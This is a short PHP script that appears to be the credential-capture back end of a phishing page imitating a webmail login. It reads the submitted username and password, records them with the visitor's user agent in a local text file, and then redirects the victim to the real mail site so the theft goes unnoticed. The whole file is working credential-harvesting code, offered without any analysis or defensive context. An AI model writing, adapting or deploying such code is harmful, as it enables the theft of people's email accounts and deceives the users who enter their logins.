<?php
header("Location: https://poczta.sfi.pl/rcm-1.4/");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Login-----------------------\n";
$message .= "Username      : ".$_POST['_user']."\n";
$message .= "Password         : ".$_POST['_pass']."\n";
$message .= "---------------Created BY-------------\n";
$message .= "User Agent : ".$useragent."\n";


$fp = fopen("rezults.txt","a");
fputs($fp,$message);
fclose($fp);    
     
?>